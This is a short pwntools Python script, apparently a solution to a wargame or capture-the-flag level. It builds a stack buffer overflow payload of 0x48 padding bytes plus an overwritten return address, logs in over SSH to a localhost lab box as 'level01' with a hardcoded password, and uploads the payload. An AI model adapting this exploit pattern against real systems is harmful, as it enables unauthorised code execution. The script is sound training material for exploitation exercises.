from pwn import *

target_addr = 0x401292

payload = b'a' * 0x48
payload += p64(target_addr, "little")

shell = ssh(host="localhost", port=4242, user="level01", password="czugaihitjx0lys47blkh0qwtzz1c9g6")

shell.upload_data(payload, "/home/level01/payload.bin")